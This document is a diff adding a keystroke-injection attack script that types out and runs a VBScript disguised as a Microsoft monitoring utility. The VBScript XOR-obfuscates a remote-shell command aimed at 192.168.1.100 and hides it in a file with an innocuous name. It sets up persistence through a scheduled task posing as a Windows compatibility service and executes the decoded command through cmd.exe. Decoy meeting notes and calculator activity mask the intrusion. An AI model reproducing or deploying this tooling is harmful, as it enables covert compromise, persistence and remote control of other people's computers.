@@ -1,0 +1,202 @@
+// Phase 1: Initial Execution with Living Off The Land Techniques
+// =============================================================
+// Use GUI-based interaction instead of command line
+GuiR
+Delay 500
+Print notepad
+Press KEY_ENTER
+Delay 1500
+
+// Create an obfuscated VBScript file using legitimate Windows scripting
+PrintLine ' System Monitoring Utility
+PrintLine ' Microsoft Windows (R) Service Framework
+PrintLine Option Explicit
+PrintLine 
+PrintLine ' Declare system variables
+PrintLine Dim objShell, objFSO, objNetwork, objWMI
+PrintLine Dim strTempDir, strAppData, strComputer, strUser
+PrintLine Dim colItems, objItem, strDirectory, strFileName
+PrintLine 
+PrintLine ' Initialize Windows environments
+PrintLine Set objShell = CreateObject("WScript.Shell")
+PrintLine Set objFSO = CreateObject("Scripting.FileSystemObject")
+PrintLine Set objNetwork = CreateObject("WScript.Network")
+PrintLine 
+PrintLine ' System paths
+PrintLine strTempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
+PrintLine strAppData = objShell.ExpandEnvironmentStrings("%APPDATA%")
+PrintLine strComputer = objNetwork.ComputerName
+PrintLine strUser = objNetwork.UserName
+PrintLine 
+PrintLine ' Utility functions
+PrintLine Function XOR(text, key)
+PrintLine   Dim textLen, keyLen, i, j, char
+PrintLine   Dim result
+PrintLine   
+PrintLine   textLen = Len(text)
+PrintLine   keyLen = Len(key)
+PrintLine   result = ""
+PrintLine   
+PrintLine   For i = 1 To textLen
+PrintLine     j = ((i - 1) Mod keyLen) + 1
+PrintLine     char = Asc(Mid(text, i, 1)) Xor Asc(Mid(key, j, 1))
+PrintLine     result = result & Chr(char)
+PrintLine   Next
+PrintLine   
+PrintLine   XOR = result
+PrintLine End Function
+PrintLine 
+PrintLine ' Monitoring service
+PrintLine Sub MonitorSystem()
+PrintLine   ' Create data directory with legitimate name
+PrintLine   strDirectory = strAppData & "\Microsoft\Windows\Recent\CustomDestinations"
+PrintLine   If Not objFSO.FolderExists(strDirectory) Then
+PrintLine     objFSO.CreateFolder(strDirectory)
+PrintLine   End If
+PrintLine   
+PrintLine   ' Low-impact data collection to avoid triggering behavioral analysis
+PrintLine   Dim dataFile
+PrintLine   strFileName = strDirectory & "\ms_catalog.dat"
+PrintLine   Set dataFile = objFSO.CreateTextFile(strFileName, True)
+PrintLine   
+PrintLine   ' Encode remote shell command using XOR to evade string detection
+PrintLine   Dim encodedCommand, actualCommand, shellCommand
+PrintLine   actualCommand = "ShellWin 192.168.1.100"
+PrintLine   encodedCommand = XOR(actualCommand, strComputer & strUser)
+PrintLine   
+PrintLine   ' Store the encoded command
+PrintLine   dataFile.WriteLine("MSFT_CATALOG_DATA:BEGIN")
+PrintLine   dataFile.WriteLine(encodedCommand)
+PrintLine   dataFile.WriteLine("MSFT_CATALOG_DATA:END")
+PrintLine   dataFile.Close
+PrintLine   
+PrintLine   ' Schedule execution
+PrintLine   objShell.Run "schtasks /create /tn ""Microsoft\Windows\Application Experience\Program Compatibility Assistant"" /tr ""wscript.exe /e:vbscript " & strDirectory & "\exec.vbs"" /sc minute /mo 30 /f", 0, True
+PrintLine End Sub
+PrintLine 
+PrintLine ' Create executor
+PrintLine Sub CreateExecutor()
+PrintLine   Dim execFile, taskData
+PrintLine   Set execFile = objFSO.CreateTextFile(strAppData & "\Microsoft\Windows\Recent\CustomDestinations\exec.vbs", True)
+PrintLine   
+PrintLine   execFile.WriteLine("On Error Resume Next")
+PrintLine   execFile.WriteLine("Dim objShell, objFSO, dataFile, encodedCommand, key")
+PrintLine   execFile.WriteLine("Set objShell = CreateObject(""WScript.Shell"")")
+PrintLine   execFile.WriteLine("Set objFSO = CreateObject(""Scripting.FileSystemObject"")")
+PrintLine   execFile.WriteLine("Set objNetwork = CreateObject(""WScript.Network"")")
+PrintLine   execFile.WriteLine("key = objNetwork.ComputerName & objNetwork.UserName")
+PrintLine   execFile.WriteLine("")
+PrintLine   execFile.WriteLine("Function XOR(text, key)")
+PrintLine   execFile.WriteLine("  Dim textLen, keyLen, i, j, char, result")
+PrintLine   execFile.WriteLine("  textLen = Len(text)")
+PrintLine   execFile.WriteLine("  keyLen = Len(key)")
+PrintLine   execFile.WriteLine("  result = """"")
+PrintLine   execFile.WriteLine("  For i = 1 To textLen")
+PrintLine   execFile.WriteLine("    j = ((i - 1) Mod keyLen) + 1")
+PrintLine   execFile.WriteLine("    char = Asc(Mid(text, i, 1)) Xor Asc(Mid(key, j, 1))")
+PrintLine   execFile.WriteLine("    result = result & Chr(char)")
+PrintLine   execFile.WriteLine("  Next")
+PrintLine   execFile.WriteLine("  XOR = result")
+PrintLine   execFile.WriteLine("End Function")
+PrintLine   execFile.WriteLine("")
+PrintLine   execFile.WriteLine("If objFSO.FileExists(""" & strAppData & "\Microsoft\Windows\Recent\CustomDestinations\ms_catalog.dat"") Then")
+PrintLine   execFile.WriteLine("  Set dataFile = objFSO.OpenTextFile(""" & strAppData & "\Microsoft\Windows\Recent\CustomDestinations\ms_catalog.dat"", 1)")
+PrintLine   execFile.WriteLine("  dataFile.ReadLine ' Skip header")
+PrintLine   execFile.WriteLine("  encodedCommand = dataFile.ReadLine")
+PrintLine   execFile.WriteLine("  dataFile.Close")
+PrintLine   execFile.WriteLine("  " & _
+              "objShell.Run ""cmd.exe /c "" & XOR(encodedCommand, key), 0, False")
+PrintLine   execFile.WriteLine("End If")
+PrintLine   execFile.Close
+PrintLine End Sub
+PrintLine 
+PrintLine ' Main execution
+PrintLine MonitorSystem
+PrintLine CreateExecutor
+PrintLine 
+PrintLine ' Execute initial connection with time delay to avoid immediate detection
+PrintLine WScript.Sleep 300000 ' 5 minute delay
+PrintLine 
+PrintLine ' Clean self-reference
+PrintLine Set objShell = Nothing
+PrintLine Set objFSO = Nothing
+PrintLine Set objNetwork = Nothing
+Delay 3000
+
+// Save the file to a location expected to contain legitimate scripts
+Press KEY_LEFT_ALT
+Print f
+Release
+Print s
+Delay 500
+Print %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.vbs
+Press KEY_ENTER
+Delay 1000
+Press KEY_LEFT_ALT
+Print F4
+Release
+Delay 500
+
+// Phase 2: Execute initial setup using minimal footprint
+// ====================================================
+GuiR
+Delay 500
+Print explorer %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine
+Press KEY_ENTER
+Delay 1500
+
+// Double-click script file to execute without command line
+// This mimics user behavior rather than programmatic execution
+Press KEY_DOWN
+Press KEY_DOWN
+Press KEY_DOWN
+Delay 500
+Press KEY_ENTER
+Press KEY_ENTER
+Delay 1000
+
+// Phase 3: Create legitimate decoy activity
+// =======================================
+GuiR
+Delay 500
+Print notepad
+Press KEY_ENTER
+Delay 1000
+PrintLine Meeting Notes - March 9, 2025
+PrintLine 
+PrintLine Attendees:
+PrintLine - John Smith
+PrintLine - Sarah Johnson
+PrintLine - Michael Williams
+PrintLine 
+PrintLine Action Items:
+PrintLine 1. Complete Q2 forecast by March 15
+PrintLine 2. Schedule vendor meeting for next week
+PrintLine 3. Review new product specifications
+Delay 2000
+Press KEY_LEFT_ALT
+Print f
+Release
+Print s
+Delay 500
+Print %USERPROFILE%\Documents\Meeting_Notes_March_9.txt
+Press KEY_ENTER
+Delay 1000
+Press KEY_LEFT_ALT
+Print F4
+Release
+Delay 500
+
+// Phase 4: Initiate callback in a way that appears as legitimate user activity
+// ===========================================================================
+// Open Windows Run dialog like a normal user
+GuiR
+Delay 3000
+// Launch calculator as a benign activity
+Print calc
+Press KEY_ENTER
+Delay 2000
+Press KEY_LEFT_ALT
+Print F4
+Release
+Delay 1000
